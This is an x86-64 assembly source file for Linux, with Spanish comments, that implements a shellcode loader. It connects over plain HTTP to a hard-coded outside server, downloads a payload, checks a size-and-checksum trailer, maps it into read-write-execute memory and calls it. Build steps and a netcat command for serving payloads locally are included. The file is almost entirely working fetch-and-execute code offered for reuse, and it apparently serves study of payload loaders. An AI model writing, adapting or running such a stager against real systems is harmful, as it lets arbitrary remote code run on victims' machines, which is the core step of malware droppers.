;===============================================================================================================================================================
; Archivo      : payload-read-http-file-size-dynamic-checksum.asm
; Creado       : 15/02/2025
; Modificado   : 06/05/2025
; Autor        : Gastón M. González
; Plataforma   : Linux
; Arquitectura : x86-64
; Descripción  : Loader de payload HTTP (no HTTPS), con payload de tamaño variable, sin límite de tamaño (predefinido en el código) y verificación de checksum
;                Descarga un payload con información adicional:
;                • Checksum global aditivo sobre el payload (3 bytes, en little endian).
;                • Tamaño del payload (3 bytes, en little endian).
;
;                El archivo que de descarga está estructurado de la siguiente manera:
;                ┌────────────────────────────┬────────────────────────┬────────────────────────┐
;                │      Payload original      │ Checksum (3 bytes, LE) │  Tamaño (3 bytes, LE)  │
;                └────────────────────────────┴────────────────────────┴────────────────────────┘
;                La información adicional es incorporada utilizando el script payloadextend.sh
;
;                Para este ejemplo, se debe generar el payload con información adicional ejecutando: ./payloadextend.sh --checksum --size <archivo-payload>
;                Ejemplo: /payloadextend.sh --checksum --size payload4KBlarger.bin
;
;                Explicación detallada en:
;                • https://github.com/Pithase/asm-payloads-loaders/blob/main/bin/README.md
;                • https://github.com/Pithase/asm-payloads-loaders/blob/main/payloadextend.sh
;
; Nota         : En el código, el tamaño máximo (headers + payload) está configurado en 16KB a través de buffer_size equ 16384
;                Si desea trabajar con un payload de un tamaño distinto, modifica dicho valor (debe ser múltiplo de 4096)
;
; Compilar     : nasm -f elf64 payload-read-http-file-size-dynamic-checksum.asm -o payload-read-http-file-size-dynamic-checksum.o
; Linkear      : ld payload-read-http-file-size-dynamic-checksum.o -o payload-read-http-file-size-dynamic-checksum
; Ejecutar     : ./payload-read-http-file-size-dynamic-checksum
; Ejecutar     : ./payload-read-http-file-size-dynamic-checksum ; echo "Código de salida:" $?
;===============================================================================================================================================================
; Para probarlo en local se deben hacer los siguientes cambios:
;
;        http_get db "GET /bin/payload4KBlarger-ext-cs.bin HTTP/1.1", 0x0D, 0x0A
; por -> http_get db "GET /payload4KBlarger-ext-cs.bin HTTP/1.1", 0x0D, 0x0A
;
;        db "Host: pithase.com.ar", 0x0D, 0x0A
; por -> db "Host: localhost", 0x0D, 0x0A
;
;        server_ip    equ 0x91431952   ; IP [82.25.67.145] del servidor en little endian
; por -> server_ip    equ 0x0100007F   ; IP [127.0.0.1] en little endian
;
;        http_port    equ 0x5000       ; puerto 80 en little endian
; por -> http_port    equ 0x401f       ; puerto 8000 en little endian
;
; Abrimos dos terminales, primero en una ejecutamos Netcat, para que sirva el archivo de paylod. Para eso
; nos ubicamos en la carpeta donde se encuentra payload.bin y ejecutamos Netcat de la siguiente forma:
;
; nc -l -p 8000 < payload.bin
;
; En la otra terminal ejecutamos el programa
;===============================================================================================================================================================
; Licencia MIT:
; Este código es de uso libre bajo los términos de la Licencia MIT.
; Puedes usarlo, modificarlo y redistribuirlo, siempre que incluyas esta nota de atribución.
; NO HAY GARANTÍA DE NINGÚN TIPO, EXPRESA O IMPLÍCITA.
; Licencia completa en: https://github.com/Pithase/asm-payloads-loaders/blob/main/LICENSE
;===============================================================================================================================================================

section .rodata
    http_get db "GET /bin/payload4KBlarger-ext-cs.bin HTTP/1.1", 0x0D, 0x0A
             db "Host: pithase.com.ar", 0x0D, 0x0A
             db "Connection: close", 0x0D, 0x0A
             db 0x0D, 0x0A, 0
    http_get_len equ $ - http_get

    server_ip    equ 0x91431952    ; IP [82.25.67.145] del servidor en little endian
    http_port    equ 0x5000        ; puerto 80 en little endian
    buffer_size  equ 16384         ; tamaño predefinido del buffer (HTTP headers + payload)

section .bss
    sockfd     resq 1
    buffer     resb buffer_size    ; espacio para la respuesta completa (HTTP headers + payload)
    exec_mem   resq 1              ; memoria ejecutable reservada con mmap

section .text
    global _start

_start:
    ;=============================================================================================
    ; 1. Crea un socket (socket(AF_INET, SOCK_STREAM, 0))
    ;=============================================================================================
    mov rax, 41
    mov rdi, 2                     ; AF_INET
    mov rsi, 1                     ; SOCK_STREAM
    mov rdx, 0
    syscall
    test rax, rax
    js socket_error
    mov [sockfd], rax

    ;=============================================================================================
    ; 2. Configurar sockaddr_in
    ;=============================================================================================
    sub rsp, 16
    mov word [rsp], 2              ; sin_family = AF_INET
    mov word [rsp+2], http_port    ; puerto 80 (producción) en little endian
    mov dword [rsp+4], server_ip   ; IP en little endian
    mov qword [rsp+8], 0

    ;=============================================================================================
    ; 3. Conecta al servidor (connect)
    ;=============================================================================================
    mov rax, 42
    mov rdi, [sockfd]
    mov rsi, rsp
    mov rdx, 16
    syscall
    test rax, rax
    js connect_error

    ;=============================================================================================
    ; 4. Envía la solicitud HTTP GET
    ;=============================================================================================
    mov rax, 44
    mov rdi, [sockfd]
    lea rsi, [http_get]
    mov rdx, http_get_len
    mov r10, 0
    syscall
    test rax, rax
    js http_get_error

    ;=============================================================================================
    ; 5. Recibe la respuesta HTTP completa en 'buffer'
    ;=============================================================================================
    xor rbx, rbx                   ; rbx: acumulador de bytes recibidos
read_loop:
    mov rax, 45                    ; syscall: recv
    mov rdi, [sockfd]
    lea rsi, [buffer + rbx]
    mov rdx, 4096                  ; cantidad máxima de bytes a leer por recv
    mov r10, 0
    syscall
    cmp rax, 0
    jle done_reading
    add rbx, rax
    cmp rbx, buffer_size
    jl read_loop
done_reading:
    cmp rbx, 6                     ; rbx = total de bytes leídos (incluye headers y payload)
    jl http_response_size_error    ; se requieren al menos 6 bytes de metadata, sirve como
                                   ; chequeo, pero no es lo ideal
    ;=============================================================================================
    ; 6. Extraer payload_length (últimos 3 bytes del total leído)
    ;=============================================================================================
    lea rsi, [buffer + rbx - 3]
    movzx eax, byte [rsi]          ; byte 0 (LSB)
    movzx edx, byte [rsi+1]
    movzx ecx, byte [rsi+2]
    mov r13d, eax                  ; r13d = payload_length
    shl edx, 8
    add r13d, edx
    shl ecx, 16
    add r13d, ecx                  ; Ahora r13d tiene la tamaño del payload

    ;=============================================================================================
    ; 7. Extraer expected_checksum (3 bytes anteriores a los anteriores)
    ;=============================================================================================
    lea rsi, [buffer + rbx - 6]
    movzx eax, byte [rsi]          ; byte 0 (LSB)
    movzx edx, byte [rsi+1]
    movzx ecx, byte [rsi+2]
    mov r12d, eax                  ; r12d = expected_checksum
    shl edx, 8
    add r12d, edx
    shl ecx, 16
    add r12d, ecx

    ;=============================================================================================
    ; 8. Calcula la dirección de inicio del payload:
    ;     payload_start = buffer + (total_leído - 6 - payload_length)
    ;=============================================================================================
    mov rax, rbx
    sub rax, 6
    sub rax, r13                   ; rax = offset de inicio del payload dentro de buffer
    lea r14, [buffer + rax]        ; r14 apunta al inicio del payload

    ;=============================================================================================
    ; 9. Calcula el checksum aditivo global sobre payload (r13 bytes a partir de r14)
    ;=============================================================================================
    mov rcx, r13                   ; cantidad de bytes del payload
    xor eax, eax                   ; acumulador para checksum
    mov rsi, r14                   ; puntero al payload
checksum_loop:
    cmp rcx, 0
    je checksum_done
    movzx edx, byte [rsi]
    add eax, edx
    inc rsi
    dec rcx
    jmp checksum_loop
checksum_done:
    cmp eax, r12d                  ; compara el checksum calculado con el esperado
    jne checksum_error

    ;=============================================================================================
    ; 10. Calcula el tamaño a mapear, redondeando al múltiplo de 4096
    ;=============================================================================================
    mov rax, r13                   ; rax = payload_length
    add rax, 4095                  ; suma 4095 para el redondeo
    and rax, 0xFFFFFFFFFFFFF000    ; redondea hacia abajo al múltiplo de 4096

    ;=============================================================================================
    ; 11. Reserva memoria ejecutable con mmap
    ;=============================================================================================
    mov rdi, 0                     ; dejar que el sistema elija la dirección
    mov rsi, rax                   ; tamaño a mapear
    mov rdx, 7                     ; PROT_READ | PROT_WRITE | PROT_EXEC
    mov r10, 0x22                  ; MAP_PRIVATE | MAP_ANONYMOUS
    mov r8, -1                     ; sin descriptor de archivo
    mov r9, 0                      ; offset = 0
    mov rax, 9                     ; syscall: mmap
    syscall
    test rax, rax
    js mmap_error
    mov [exec_mem], rax            ; guardar la dirección asignada

    ;=============================================================================================
    ; 12. Copia el payload (r13 bytes, desde r14) a la memoria reservada
    ;=============================================================================================
    mov rdi, [exec_mem]
    mov rsi, r14
    mov rcx, r13
    rep movsb

    ;=============================================================================================
    ; 13. Cierra el socket
    ;=============================================================================================
    mov rax, 3
    mov rdi, [sockfd]
    syscall

    ;=============================================================================================
    ; 14. Ejecuta el payload
    ;=============================================================================================
    call qword [exec_mem]          ; llama al payload cargado en memoria

    ;=============================================================================================
    ; 15. Salida: Se alcanza solo si el payload retorna
    ;=============================================================================================
    mov rax, 60                    ; syscall: exit
    xor rdi, rdi
    syscall

;=============================================================================================
; Manejo de errores: Salida con código distinto según el error
; Se incluye la liberación de recursos (cierre del socket) antes de salir
;=============================================================================================
socket_error:
    mov rdi, 1
    jmp exit_error

connect_error:
    mov rdi, 2
    jmp exit_error

http_get_error:
    mov rdi, 3
    jmp exit_error

http_response_size_error:
    mov rdi, 4
    jmp exit_error

mmap_error:
    mov rdi, 6
    jmp exit_error

checksum_error:
    mov rdi, 7

exit_error:
    push rdi
    mov rax, [sockfd]              ; si el socket fue abierto, cerrarlo.
    cmp rax, 0
    je exit
    mov rdi, rax
    mov rax, 3                     ; syscall: close
    syscall
    pop rdi

exit:
    mov rax, 60                    ; syscall: exit
    syscall
